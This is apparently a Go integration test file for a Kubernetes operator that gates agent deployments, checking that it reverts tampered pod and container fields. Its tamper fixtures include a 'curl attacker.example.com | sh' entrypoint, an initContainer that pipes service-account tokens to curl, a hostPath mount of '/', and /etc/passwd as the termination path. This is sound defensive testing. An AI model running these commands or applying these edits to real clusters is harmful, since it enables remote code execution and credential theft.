				t.Fatalf("get: %v", err)
			}
			tc.check(t, d.Spec.Template.Spec.Containers[0])
		})
	}
}

// ADR-0031 — a port edit MINTS a revision. This test asserted the inverse until
// 2026-09-05: it pinned "a port edit reaches the running workload without a new
// revision" as correct, so the bypass it describes was covered by a passing
// test. An approved image may serve the evaluated A2A implementation on 8080
// and an administrative or simply different handler on 9090; Kubernetes does
// not require two ports of one container to serve the same program. Editing the
// port under an unchanged digest published code the gate never exercised.
func TestPortEditMintsARevision(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "portedit", nil)
	r := newReconciler(false)
	rev := revision.MustHash(a.Spec)
	settle(t, r, a)
	markAvailable(t, ns, controller.WorkloadName("portedit", rev), 1)
	settle(t, r, a)

	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), a); err != nil {
		t.Fatalf("get: %v", err)
	}
	a.Spec.Runtime.Port = 9090
	if err := k8s.Update(context.Background(), a); err != nil {
		t.Fatalf("update: %v", err)
	}
	next := revision.MustHash(a.Spec)
	if next == rev {
		t.Fatal("a port edit did not mint a revision: an approved image can serve a " +
			"different program on a different port, so this reaches production through no gate")
	}
	settle(t, r, a)

	// The evaluated revision keeps its own workload on its own port: the edit
	// produced a candidate, it did not rewrite what was gated.
	var d appsv1.Deployment
	key := types.NamespacedName{Namespace: runNS(ns), Name: controller.WorkloadName("portedit", rev)}
	if err := k8s.Get(context.Background(), key, &d); err != nil {
		t.Fatalf("get gated workload: %v", err)
	}
	if p := d.Spec.Template.Spec.Containers[0].Ports; len(p) != 1 || p[0].ContainerPort != 8080 {
		t.Errorf("the gated revision's container port is %v; the in-place edit rewrote it", p)
	}
}

// Y1 — the four fields assayd left unset were unreverted drift, and one was an
// escalation path. An operator that reverts the image tag but tolerates
// imagePullPolicy: Never has corrected nothing: Never tells the kubelet to use
// whatever local image already carries that tag, so an attacker who can also
// place an image on a node keeps a poisoned workload while assayd reports Ready.
// It also sidesteps ADR-0019's cosign posture — nothing pulls, so nothing is
// verified at pull time.
func TestPreviouslyExemptedFieldsAreReverted(t *testing.T) {
	for _, tc := range []struct {
		field  string
		tamper func(*corev1.Container)
		check  func(*testing.T, corev1.Container)
	}{
		{
			field:  "imagepullpolicy",
			tamper: func(c *corev1.Container) { c.ImagePullPolicy = corev1.PullNever },
			check: func(t *testing.T, c corev1.Container) {
				if c.ImagePullPolicy != corev1.PullAlways {
					t.Errorf("imagePullPolicy is %q, want Always. Never pins whatever local "+
						"image carries this tag, so reverting the tag corrects nothing and "+
						"no pull means no signature check", c.ImagePullPolicy)
				}
			},
		},
		{
			field:  "terminationmessagepath",
			tamper: func(c *corev1.Container) { c.TerminationMessagePath = "/etc/passwd" },
			check: func(t *testing.T, c corev1.Container) {
				if c.TerminationMessagePath != corev1.TerminationMessagePathDefault {
					t.Errorf("terminationMessagePath is %q: the kubelet reads up to 4KB from "+
						"it into pod status, readable by anyone with pod-get",
						c.TerminationMessagePath)
				}
			},
		},
		{
			field:  "protocol",
			tamper: func(c *corev1.Container) { c.Ports[0].Protocol = corev1.ProtocolUDP },
			check: func(t *testing.T, c corev1.Container) {
				if len(c.Ports) != 1 || c.Ports[0].Protocol != corev1.ProtocolTCP {
					t.Errorf("port protocol is %v, want TCP", c.Ports)
				}
			},
		},
		// Y2 — replaces the hostPort probe, which could not fail. apimachinery's
		// deepValueDerive skips zero values only for Slice, String, Map and Ptr
		// kinds; numeric and boolean fields fall through to full DeepEqual, so an
		// int32 hostPort was already caught derivatively. The gap is UNSET fields
		// of those four kinds — and overriding the entrypoint is the sharpest
		// instance, since assayd leaves Command and Args unset entirely.
		{
			field: "command",
			tamper: func(c *corev1.Container) {
				c.Command = []string{"/bin/sh", "-c", "curl attacker.example.com | sh"}
			},
			check: func(t *testing.T, c corev1.Container) {
				if len(c.Command) != 0 {
					t.Errorf("an injected entrypoint survived: %v. Command is a slice and "+
						"assayd leaves it unset, so a derivative comparison skips it — anyone "+
						"with deployments/update could replace what the container runs while "+
						"the image tag, and therefore the revision, looks untouched", c.Command)
				}
			},
		},
		{
			field:  "workingdir",
			tamper: func(c *corev1.Container) { c.WorkingDir = "/tmp/attacker" },
			check: func(t *testing.T, c corev1.Container) {
				if c.WorkingDir != "" {
					t.Errorf("workingDir %q survived: an unset string is skipped derivatively", c.WorkingDir)
				}
			},
		},
	} {
		t.Run(tc.field, func(t *testing.T) {
			ns := newNamespace(t)
			name := "exempt-" + tc.field
			a := mustCreateAgent(t, ns, name, nil)
			r := newReconciler(false)
			rev := revision.MustHash(a.Spec)
			settle(t, r, a)
			key := types.NamespacedName{Namespace: runNS(ns), Name: controller.WorkloadName(name, rev)}
			markAvailable(t, ns, key.Name, 1)
			settle(t, r, a)

			var d appsv1.Deployment
			if err := k8s.Get(context.Background(), key, &d); err != nil {
				t.Fatalf("get: %v", err)
			}
			tc.tamper(&d.Spec.Template.Spec.Containers[0])
			if err := k8s.Update(context.Background(), &d); err != nil {
				t.Fatalf("tamper: %v", err)
			}
			settle(t, r, a)

			if err := k8s.Get(context.Background(), key, &d); err != nil {
				t.Fatalf("get: %v", err)
			}
			tc.check(t, d.Spec.Template.Spec.Containers[0])
		})
	}
}

// B1 — the PodSpec surrounding the container was compared derivatively, and
// deploymentFor set none of its fields, so every unset slice/string/map/pointer
// field was invisible. An injected initContainer with an upgraded service
// account survives forever: arbitrary code before the agent container starts,
// holding a token the same edit can grant.
//
// This is the attack the drift-correction comment already names, one field over.
// The container-level tests passed throughout, which is what hid it.
func TestPodSpecDriftIsReverted(t *testing.T) {
	for _, tc := range []struct {
		field  string
		tamper func(*corev1.PodSpec)
		check  func(*testing.T, corev1.PodSpec)
	}{
		{
			field: "initcontainers",
			tamper: func(p *corev1.PodSpec) {
				p.InitContainers = []corev1.Container{{
					Name: "exfil", Image: "busybox",
					Command: []string{"sh", "-c", "cat /var/run/secrets/**/token | curl -d @- evil"},
				}}
			},
			check: func(t *testing.T, p corev1.PodSpec) {
				if len(p.InitContainers) != 0 {
					t.Errorf("an injected initContainer survived: %v. It runs arbitrary code "+
						"before the agent container starts, so the gate passed on one thing and "+
						"the pod runs another — a more complete ADR-0006 bypass than an image swap",
						p.InitContainers)
				}
			},
		},
		{
			field:  "serviceaccount",
			tamper: func(p *corev1.PodSpec) { p.ServiceAccountName = "privileged-sa" },
			check: func(t *testing.T, p corev1.PodSpec) {
				if p.ServiceAccountName == "privileged-sa" {
					t.Error("an escalated serviceAccountName survived: the workload now runs " +
						"with credentials the Agent CR never granted")
				}
			},
		},
		{
			field: "volumes",
			tamper: func(p *corev1.PodSpec) {
				p.Volumes = []corev1.Volume{{
					Name: "host", VolumeSource: corev1.VolumeSource{
						HostPath: &corev1.HostPathVolumeSource{Path: "/"}}}}
			},
			check: func(t *testing.T, p corev1.PodSpec) {
				if len(p.Volumes) != 0 {
					t.Errorf("an injected hostPath volume survived: %v", p.Volumes)
				}
			},
		},
		{
			field:  "nodeselector",
			tamper: func(p *corev1.PodSpec) { p.NodeSelector = map[string]string{"attacker": "node"} },
			check: func(t *testing.T, p corev1.PodSpec) {
				if len(p.NodeSelector) != 0 {
					t.Errorf("an injected nodeSelector survived: %v — a map, so derivative "+
						"comparison skips it when desired leaves it unset", p.NodeSelector)
				}
			},
		},
		{
			field: "imagepullsecrets",
			tamper: func(p *corev1.PodSpec) {
				p.ImagePullSecrets = []corev1.LocalObjectReference{{Name: "attacker-registry"}}
			},
			check: func(t *testing.T, p corev1.PodSpec) {
				if len(p.ImagePullSecrets) != 0 {
					t.Errorf("injected imagePullSecrets survived: %v — this redirects where "+
						"the image comes from, defeating the tag revert", p.ImagePullSecrets)
				}
			},
		},
		{
			field:  "automount",
			tamper: func(p *corev1.PodSpec) { p.AutomountServiceAccountToken = boolPtr(true) },
			check: func(t *testing.T, p corev1.PodSpec) {
				if p.AutomountServiceAccountToken == nil || *p.AutomountServiceAccountToken {
					t.Error("automountServiceAccountToken was turned on and stayed on: an " +
						"agent has no reason to hold an API token, and this is the exfil path")
				}
			},
		},
	} {
		t.Run(tc.field, func(t *testing.T) {
			ns := newNamespace(t)
			name := "podspec-" + tc.field
			a := mustCreateAgent(t, ns, name, nil)
			r := newReconciler(false)
			rev := revision.MustHash(a.Spec)
			settle(t, r, a)
			key := types.NamespacedName{Namespace: runNS(ns), Name: controller.WorkloadName(name, rev)}
			markAvailable(t, ns, key.Name, 1)
			settle(t, r, a)

			var d appsv1.Deployment
			if err := k8s.Get(context.Background(), key, &d); err != nil {
				t.Fatalf("get: %v", err)
			}
			tc.tamper(&d.Spec.Template.Spec)
			if err := k8s.Update(context.Background(), &d); err != nil {
				t.Fatalf("tamper: %v", err)
			}
			settle(t, r, a)

			if err := k8s.Get(context.Background(), key, &d); err != nil {
				t.Fatalf("get: %v", err)
			}
			tc.check(t, d.Spec.Template.Spec)
		})
	}
}

// The convergence guard for B1's fix: whatever the API server defaults on a pod
// template must already be set by deploymentFor, or the operator rewrites the
// Deployment forever. Diffing a created object against what we asked for makes a
// future Kubernetes bump that defaults a new field fail CI, rather than silently
// reopening the hole by forcing another exemption.
func TestRenderedPodSpecSurvivesAPIServerDefaulting(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "defaulting", nil)
	r := newReconciler(false)
	rev := revision.MustHash(a.Spec)
	settle(t, r, a)

	var d appsv1.Deployment
	key := types.NamespacedName{Namespace: runNS(ns), Name: controller.WorkloadName("defaulting", rev)}
	if err := k8s.Get(context.Background(), key, &d); err != nil {
		t.Fatalf("get: %v", err)
	}

	counter := &countingClient{Client: k8s}
	counting := &controller.AgentReconciler{
		Client: counter, Scheme: scheme, EvalSuiteInstalled: func() bool { return false },
		OperatorNamespace: operatorNamespace, LabelAuthorityPresent: labelAuthorityPresent,
	}
	for i := 0; i < 5; i++ {
		reconcileOnce(t, counting, a)
	}
	if n := counter.count(); n != 0 {
		t.Errorf("five reconciles of a freshly created workload issued %d writes. The "+
			"operator is fighting API-server defaulting: some field it compares is one it "+
			"does not set, so every pass sees a difference and rewrites.", n)
	}
}

// The Degraded phase must come with the Degraded CONDITION. CondDegraded is
// owned and non-sticky, so a path that sets only the phase actively clears the
// condition — and an alert keyed on it would miss the worst case in the
// machine: the active revision losing every replica.
func TestDegradedPhaseAssertsTheDegradedCondition(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "degradedcond", nil)
	r := newReconciler(false)
	rev := revision.MustHash(a.Spec)
	settle(t, r, a)
	markAvailable(t, ns, controller.WorkloadName("degradedcond", rev), 1)
	got := settle(t, r, a)
	if got.Status.Phase != assaydv1alpha1.PhaseReady {
		t.Fatalf("fixture: phase is %q", got.Status.Phase)
	}

	markAvailable(t, ns, controller.WorkloadName("degradedcond", rev), 0)
	got = settle(t, r, a)

	if got.Status.Phase != assaydv1alpha1.PhaseDegraded {
		t.Fatalf("phase is %q, want Degraded", got.Status.Phase)
	}
	c := condition(&got, assaydv1alpha1.CondDegraded)
	if c == nil || c.Status != metav1.ConditionTrue {
		t.Error("phase is Degraded but the Degraded condition is not set. Anything keyed " +
			"on the condition rather than the phase — which is the documented way to " +
			"alert — sees a healthy agent.")
	}
}
